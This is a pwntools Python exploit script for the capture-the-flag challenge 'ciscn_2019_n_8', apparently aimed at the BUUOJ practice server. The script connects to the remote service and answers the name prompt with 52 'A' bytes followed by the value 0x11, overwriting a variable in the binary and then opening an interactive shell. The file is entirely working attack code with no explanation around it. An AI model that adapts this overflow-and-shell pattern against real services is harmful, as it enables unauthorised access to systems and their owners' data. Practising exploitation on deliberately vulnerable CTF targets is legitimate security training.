#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './ciscn_2019_n_8'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_host  = 'node3.buuoj.cn'
remote_port = 29871

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'
context.arch = 'amd64' # 'i386'

# info
# elf, libc

# rop1
len = 4*13
payload = 'A'*len
payload += p32(0x11)

p.recvuntil("What's your name?\n")

# gdb.attach(p)

p.sendline(payload)

# log.info('')
# log.warning('--------------')

p.interactive()

